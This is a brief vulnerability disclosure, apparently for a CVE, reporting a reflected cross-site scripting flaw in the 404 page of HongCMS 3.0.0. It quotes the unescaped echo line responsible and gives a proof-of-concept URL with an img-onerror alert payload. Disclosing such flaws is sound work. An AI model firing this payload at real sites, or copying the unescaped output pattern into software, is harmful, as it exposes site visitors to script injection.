## There is a reflective XSS on the 404 page of the web site

Powered by Shiyan

##### Vulnerability analysis：

In the 404 error page, the wrong code was used, resulting in the existence of XSS vulnerability.

##### Loophole code：

HongCMS_3.0.0_free\system\errors\404.php

Sixtieth lines

`<?php echo $debugmsg; ?>`

##### Reflected XSS PoC:

`http://127.0.0.1/hongcms_3.0.0_free/index.php/abou<img src=x onerror=alert('shiyan')>`

##### Vulnerability trigger screenshot：

![1](https://github.com/lzlzh2016/CVE/blob/master/1.png)

Note: the vulnerability will be exploited by malicious users.
